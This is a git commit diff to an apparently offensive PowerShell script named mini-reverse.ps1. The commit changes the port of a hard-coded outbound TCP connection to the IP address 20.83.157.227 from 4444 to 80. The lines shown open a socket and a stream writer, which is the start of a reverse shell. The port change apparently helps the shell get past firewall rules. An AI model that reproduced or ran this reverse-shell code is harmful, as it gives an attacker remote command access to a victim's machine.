f3eb754ca7053541d5102f9e0f9deca82f5d176a
nosfera0x2 <82817752+nosfera0x2@users.noreply.github.com>
2023-10-22 11:47:46 -0700

    Update mini-reverse.ps1

--- mini-reverse.ps1
+++ mini-reverse.ps1
@@ -1,4 +1,4 @@
-$socket = new-object System.Net.Sockets.TcpClient('20.83.157.227', 4444);
+$socket = new-object System.Net.Sockets.TcpClient('20.83.157.227', 80);
 if($socket -eq $null){exit 1}
 $stream = $socket.GetStream();
 $writer = new-object System.IO.StreamWriter($stream);
